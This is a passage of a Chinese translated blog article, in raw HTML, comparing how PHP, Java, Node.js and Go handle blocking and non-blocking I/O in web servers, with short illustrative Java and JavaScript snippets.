[Format Time: 0.0017 seconds] -->\r\n<p>关于它如何与系统集成，就像这样：<br>\n<img class=\"aligncenter\" src=\"http://7xslqv.com1.z0.glb.clouddn.com/images/b/8a/0d78356a18a040600cad68d52b7ae.jpg\" alt=\"\"></p>\n<p>相当简单：一个请求，一个进程。I/O是阻塞的。优点是什么呢？简单，可行。那缺点是什么呢？同时与20,000个客户端连接，你的服务器就挂了。由于内核提供的用于处理大容量I/O（epoll等）的工具没有被使用，所以这种方法不能很好地扩展。更糟糕的是，为每个请求运行一个单独的过程往往会使用大量的系统资源，尤其是内存，这通常是在这样的场景中遇到的第一件事情。</p>\n<p><em>注意：Ruby使用的方法与PHP非常相似，在广泛而普遍的方式下，我们可以将其视为是相同的。</em></p>\n<h2 id=\"java\">多线程的方式：Java</h2>\n<p>所以就在你买了你的第一个域名的时候，Java来了，并且在一个句子之后随便说一句“dot com”是很酷的。而Java具有语言内置的多线程（特别是在创建时），这一点非常棒。</p>\n<p>大多数Java网站服务器通过为每个进来的请求启动一个新的执行线程，然后在该线程中最终调用作为应用程序开发人员的你所编写的函数。</p>\n<p>在Java的Servlet中执行I/O操作，往往看起来像是这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd525ccc69049857107\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">JavaScript</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic void doGet(HttpServletRequest request,  \r\n    HttpServletResponse response) throws ServletException, IOException\r\n{\r\n\r\n    // 阻塞的文件I/O\r\n    InputStream fileIs = new FileInputStream(\"/path/to/file\");\r\n\r\n    // 阻塞的网络I/O\r\n    URLConnection urlConnection = (new URL(\"http://example.com/example-microservice\")).openConnection();\r\n    InputStream netIs = urlConnection.getInputStream();\r\n\r\n    // 更多阻塞的网络I/O\r\n    out.println(\"...\");\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc69049857107-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc69049857107-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc69049857107-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc69049857107-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc69049857107-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc69049857107-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc69049857107-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc69049857107-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc69049857107-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc69049857107-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc69049857107-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc69049857107-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc69049857107-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc69049857107-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd525ccc69049857107-1\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">doGet</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">HttpServletRequest </span><span class=\"crayon-v\">request</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc69049857107-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">HttpServletResponse </span><span class=\"crayon-v\">response</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">throws </span><span class=\"crayon-v\">ServletException</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">IOException</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc69049857107-3\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc69049857107-4\"> </div><div class=\"crayon-line\" id=\"crayon-594bd525ccc69049857107-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 阻塞的文件I/O</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc69049857107-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">InputStream </span><span class=\"crayon-v\">fileIs</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FileInputStream</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"/path/to/file\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc69049857107-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc69049857107-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 阻塞的网络I/O</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc69049857107-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">URLConnection </span><span class=\"crayon-v\">urlConnection</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">URL</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://example.com/example-microservice\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">openConnection</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc69049857107-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">InputStream </span><span class=\"crayon-v\">netIs</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">urlConnection</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getInputStream</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc69049857107-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc69049857107-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 更多阻塞的网络I/O</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc69049857107-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"...\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc69049857107-14\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0025 seconds] -->\r\n<p>由于我们上面的<code>doGet</code>方法对应于一个请求并且在自己的线程中运行，而不是每次请求都对应需要有自己专属内存的单独进程，所以我们会有一个单独的线程。这样会有一些不错的优点，例如可以在线程之间共享状态、共享缓存的数据等，因为它们可以相互访问各自的内存，但是它如何与调度进行交互的影响，仍然与前面PHP例子中所做的内容几乎一模一样。每个请求都会产生一个新的线程，而在这个线程中的各种I/O操作会一直阻塞，直到这个请求被完全处理为止。为了最小化创建和销毁它们的成本，线程会被汇集在一起，但是依然，有成千上万个连接就意味着成千上万个线程，这对于调度器是不利的。</p>\n<p>一个重要的里程碑是，在Java 1.4 版本（和再次显著升级的1.7 版本）中，获得了执行非阻塞I/O调用的能力。大多数应用程序，网站和其他程序，并没有使用它，但至少它是可获得的。一些Java网站服务器尝试以各种方式利用这一点; 然而，绝大多数已经部署的Java应用程序仍然如上所述那样工作。<br>\n<img class=\"aligncenter\" src=\"http://7xslqv.com1.z0.glb.clouddn.com/images/f/68/fb1694b52ffd8ea112ec2fb5570c0.jpg\" alt=\"\"></p>\n<p>Java让我们更进了一步，当然对于I/O也有一些很好的“开箱即用”的功能，但它仍然没有真正解决问题：当你有一个严重I/O绑定的应用程序正在被数千个阻塞线程狂拽着快要坠落至地面时怎么办。</p>\n<h2 id=\"ionode\">作为一等公民的非阻塞I/O：Node</h2>\n<p>当谈到更好的I/O时，Node.js无疑是新宠。任何曾经对Node有过最简单了解的人都被告知它是“非阻塞”的，并且它能有效地处理I/O。在一般意义上，这是正确的。但魔鬼藏在细节中，当谈及性能时这个巫术的实现方式至关重要。</p>\n<p>本质上，Node实现的范式不是基本上说“在这里编写代码来处理请求”，而是转变成“在这里写代码开始处理请求”。每次你都需要做一些涉及I/O的事情，发出请求或者提供一个当完成时Node会调用的回调函数。</p>\n<p>在求中进行I/O操作的典型Node代码，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd525ccc6f042005924\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhttp.createServer(function(request, response) {  \r\n    fs.readFile('/path/to/file', 'utf8', function(err, data) {\r\n        response.end(data);\r\n    });\r\n});\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc6f042005924-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc6f042005924-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc6f042005924-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc6f042005924-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc6f042005924-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc6f042005924-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd525ccc6f042005924-1\"><span class=\"crayon-v\">http</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">createServer</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">function</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">request</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">response</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc6f042005924-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">fs</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">readFile</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'/path/to/file'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'utf8'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">function</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">err</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc6f042005924-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">response</span><span class=\"crayon-sy\">.</span><span class=\"crayon-st\">end</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc6f042005924-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc6f042005924-5\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc6f042005924-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>可以看到，这里有两个回调函数。第一个会在请求开始时被调用，而第二个会在文件数据可用时被调用。</p>\n<p>这样做的基本上给了Node一个在这些回调函数之间有效地处理I/O的机会。一个更加相关的场景是在Node中进行数据库调用，但我不想再列出这个烦人的例子，因为它是完全一样的原则：启动数据库调用，并提供一个回调函数给Node，它使用非阻塞调用单独执行I/O操作，然后在你所要求的数据可用时调用回调函数。这种I/O调用队列，让Node来处理，然后获取回调函数的机制称为“事件循环”。它工作得非常好。<br>\n<img class=\"aligncenter\" src=\"http://7xslqv.com1.z0.glb.clouddn.com/images/0/86/9f1e8acd49501f676dffef7f3c642.jpg\" alt=\"\"></p>\n<p>然而，这个模型中有一道关卡。在幕后，究其原因，更多是如何实现JavaScript V8 引擎（Chrome的JS引擎，用于Node）<a href=\"http://www.journaldev.com/7462/node-js-architecture-single-threaded-event-loop\">1</a>，而不是其他任何事情。你所编写的JS代码全部都运行在一个线程中。思考一下。这意味着当使用有效的非阻塞技术执行I/O时，正在进行CPU绑定操作的JS可以在运行在单线程中，每个代码块阻塞下一个。 一个常见的例子是循环数据库记录，在输出到客户端前以某种方式处理它们。以下是一个例子，演示了它如何工作：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd525ccc73473635477\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">JavaScript</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvar handler = function(request, response) {\r\n\r\n    connection.query('SELECT ...', function (err, rows) {\r\n\r\n        if (err) { throw err };\r\n\r\n        for (var i = 0; i &lt; rows.length; i++) {\r\n            // 对每一行纪录进行处理\r\n        }\r\n\r\n        response.end(...); // 输出结果\r\n\r\n    })\r\n\r\n};</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc73473635477-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc73473635477-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc73473635477-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc73473635477-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc73473635477-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc73473635477-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc73473635477-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc73473635477-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc73473635477-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc73473635477-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc73473635477-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc73473635477-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc73473635477-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc73473635477-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc73473635477-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd525ccc73473635477-1\"><span class=\"crayon-t\">var</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">handler</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">function</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">request</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">response</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc73473635477-2\"> </div><div class=\"crayon-line\" id=\"crayon-594bd525ccc73473635477-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">connection</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">query</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'SELECT ...'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">err</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc73473635477-4\"> </div><div class=\"crayon-line\" id=\"crayon-594bd525ccc73473635477-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">err</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">throw</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc73473635477-6\"> </div><div class=\"crayon-line\" id=\"crayon-594bd525ccc73473635477-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">var</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc73473635477-8\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// 对每一行纪录进行处理</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc73473635477-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc73473635477-10\"> </div><div class=\"crayon-line\" id=\"crayon-594bd525ccc73473635477-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">response</span><span class=\"crayon-sy\">.</span><span class=\"crayon-st\">end</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 输出结果</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc73473635477-12\"> </div><div class=\"crayon-line\" id=\"crayon-594bd525ccc73473635477-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc73473635477-14\"> </div><div class=\"crayon-line\" id=\"crayon-594bd525ccc73473635477-15\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0025 seconds] -->\r\n<p>虽然Node确实可以有效地处理I/O，但上面的例子中的<code>for</code>循环使用的是在你主线程中的CPU周期。这意味着，如果你有10,000个连接，该循环有可能会让你整个应用程序慢如蜗牛，具体取决于每次循环需要多长时间。每个请求必须分享在主线程中的一段时间，一次一个。</p>\n<p>这个整体概念的前提是I/O操作是最慢的部分，因此最重要是有效地处理这些操作，即使意味着串行进行其他处理。这在某些情况下是正确的，但不是全都正确。</p>\n<p>另一点是，虽然这只是一个意见，但是写一堆嵌套的回调可能会令人相当讨厌，有些人认为它使得代码明显无章可循。在Node代码的深处，看到嵌套四层、嵌套五层、甚至更多层级的嵌套并不罕见。</p>\n<p>我们再次回到了权衡。如果你主要的性能问题在于I/O，那么Node模型能很好地工作。然而，它的阿喀琉斯之踵（译者注：来自希腊神话，表示致命的弱点）是如果不小心的话，你可能会在某个函数里处理HTTP请求并放置CPU密集型代码，最后使得每个连接慢得如蜗牛。</p>\n<h2 id=\"go\">真正的非阻塞：Go</h2>\n<p>在进入Go这一章节之前，我应该披露我是一名Go粉丝。我已经在许多项目中使用Go，是其生产力优势的公开支持者，并且在使用时我在工作中看到了他们。</p>\n<p>也就是说，我们来看看它是如何处理I/O的。Go语言的一个关键特性是它包含自己的调度器。并不是每个线程的执行对应于一个单一的OS线程，Go采用的是“goroutines”这一概念。Go运行时可以将一个goroutine分配给一个OS线程并使其执行，或者把它挂起而不与OS线程关联，这取决于goroutine做的是什么。来自Go的HTTP服务器的每个请求都在单独的Goroutine中处理。</p>\n<p>此调度器工作的示意图，如下所示：<br>\n<img class=\"aligncenter\" title=\"\" src=\"http://7xslqv.com1.z0.glb.clouddn.com/images/f/dc/c99ced01713937ff76afc9b56416c.jpg\" alt=\"\"></p>\n<p>这是通过在Go运行时的各个点来实现的，通过将请求写入/读取/连接/等实现I/O调用，让当前的goroutine进入睡眠状态，当可采取进一步行动时用信息把goroutine重新唤醒。</p>\n<p>实际上，除了回调机制内置到I/O调用的实现中并自动与调度器交互外，Go运行时做的事情与Node做的事情并没有太多不同。它也不受必须把所有的处理程序代码都运行在同一个线程中这一限制，Go将会根据其调度器的逻辑自动将Goroutine映射到其认为合适的OS线程上。最后代码类似这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd525ccc78399384507\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" 